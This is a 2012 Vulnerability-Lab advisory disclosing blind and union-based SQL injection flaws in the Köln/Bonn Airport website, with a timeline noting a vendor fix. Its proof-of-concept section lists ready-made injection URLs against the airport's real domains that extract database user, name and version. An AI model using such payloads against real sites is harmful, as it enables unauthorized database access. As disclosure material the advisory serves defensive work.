Title:
======
Airport Koeln/Bonn - Blind SQL Injection Vulnerabilities


Date:
=====
2012-01-20


References:
===========
http://www.vulnerability-lab.com/get_content.php?id=174


VL-ID:
=====
174


Introduction:
=============
Der Köln Bonn Airport ist einer der größten Verkehrsflughäfen Deutschlands. Jährlich entscheiden sich mehr als 10 Millionen 
Passagiere für den „Flughafen der kurzen Wege“ – damit liegt er bundesweit auf Platz sechs. Mit etwa 590 000 Tonnen umgeschlagener 
Luftfracht pro Jahr hält Köln/Bonn hinter Frankfurt Platz zwei. Passagieraufkommen und Frachtumschlag zusammengenommen landet der 
Airport auf Rang vier....    mehr

Als die Low-Cost-Carrier Germanwings und TUIfly den einstigen Regierungsflughafen „Konrad Adenauer“ im Jahr 2002 zu ihrer Heimatbasis 
erklärten, entwickelte sich Köln/Bonn rasant. Das Passagieraufkommen hat sich binnen fünf Jahren verdoppelt, die Zahl der Reiseziele 
überschritt die Marke 130. Geographisch liegt der Airport in einer der am dichtesten besiedelten Regionen Europas; etwa 15,5 Millionen 
Menschen leben im Umkreis von 100 Kilometern. Die hervorragende Verkehrsinfrastruktur sowie die 24-Stunden-Betriebserlaubnis begründen 
das Wachstumspotenzial, dass der Airport mit seinen drei Start- und Landebahnen hat.

In den beiden Terminals gibt es 86 Check-In-Schalter. Über 55 Gates und 19 Fluggastbrücken erreichen Passagiere die Flugzeuge. Die neue 
Passagierkontrollstelle im Terminal 1 wurde Ende vergangenen Jahres von 10 auf 18 Kontrollspuren erweitert.
Köln/Bonn ist ideal über Autobahnen und Schnellstraßen zu erreichen. Seit 2004 verbindet der unterirdische Flughafen-Bahnhof die Terminals 
1 und 2 miteinander. Täglich halten dort 170 Züge, unter anderem Intercity, Regional- und S-Bahnen. In drei Parkhäusern stehen zusammen 11 
200 Stellplätze zur Verfügung.

(Copy of the Vendor Homepage: http://www.airport-cgn.de/main.php?id=49&lang=1)


Abstract:
=========
An anonymous Vulnerability Laboratory Researcher discovered multiple critical SQL Injection Vulnerabilities on the 
official Bonn and Koeln Airport Vendor Website.


Report-Timeline:
================
2011-03-02:	Vendor Notification
2011-**-**:	Vendor Response/Feedback
2012-01-03:	Vendor Fix/Patch
2012-01-20:	Public or Non-Public Disclosure


Status:
========
Published


Affected Products:
==================

Exploitation-Technique:
=======================
Remote


Severity:
=========
Critical


Details:
========
Multiple Blind SQl Injection vulnerabilities are detected on the Köln/Bonn Airport Website. The vulnerability allows remote attackers 
to inject own sql commands on the affected application dbms. Successful exploitation can result in dbms, website & application compromise.

Vulnerable Module(s): 
						[+] Index & Main

Picture(s):
						../sql1.png


Proof of Concept:
=================
The vulnerabilities can be exploited by remote attackers without user inter action. For demonstration or reproduce ...

Vulnerable Files: 			index.php ; main.php
Vulnerable Value:			?langID=  ; &id=4&sm=  ; ?id=174&kat=

Blind SQL Injection - Reference(s):
http://www.airport-cgn.de/barrierefrei/index.php?langID=1+AND+IF%28SUBSTRING%28VERSION%28%29,1,1%29=5,1,2%29=1&id=5&sm=-1%27
http://www.airport-cgn.de/barrierefrei/index.php?langID=1&id=4&sm=11%20order%20by%201--
http://www.koeln-bonn-airport.de/main.php?id=174&kat=1 and 1=2--

SQL Injection - Reference(s):
http://www.airport-cgn.de/barrierefrei/index.php?langID=1&id=-1%20union%20all%20select%201,CONCAT_WS%28CHAR%2832,58,32%29,user%28%29,database%28%29,version%28%29%29--
http://www.koeln-bonn-airport.de/main.php?id=174&kat=-1%20union%20all%20select%201,2,CONCAT_WS%28CHAR%2832,58,32%29,user%28%29,database%28%29,version%28%29%29,4,5,CONCAT_WS%28CHAR%2832,58,32%29,user%28%29,database%28%29,version%28%29%29,7--


Blind SQL Injection - Reference(s):
http://www.airport-cgn.de/barrierefrei/index.php?langID=1+AND+IF%28SUBSTRING%28VERSION%28%29,1,1%29=5,1,2%29=1&id=5&sm=-1%27
http://www.airport-cgn.de/barrierefrei/index.php?langID=1&id=4&sm=11%20order%20by%201--
http://www.koeln-bonn-airport.de/main.php?id=174&kat=1 and 1=2--


Solution:
=========
2012-01-03:	Vendor Fix/Patch


Risk:
=====
The security risk of the blind sql injection vulnerabilities are estimated as critical.


Credits:
========
Vulnerability Research Laboratory  -  N/A Anonymous


Disclaimer:
===========
The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties, 
either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-
Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business 
profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some 
states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation 
may not apply. Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability-
Lab. Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of 
other media, are reserved by Vulnerability-Lab or its suppliers.

    						Copyright © 2012|Vulnerability-Lab




-- 
Website: www.vulnerability-lab.com ; vuln-lab.com or vuln-db.com
Contact: admin@vulnerability-lab.com or support@vulnerability-lab.com

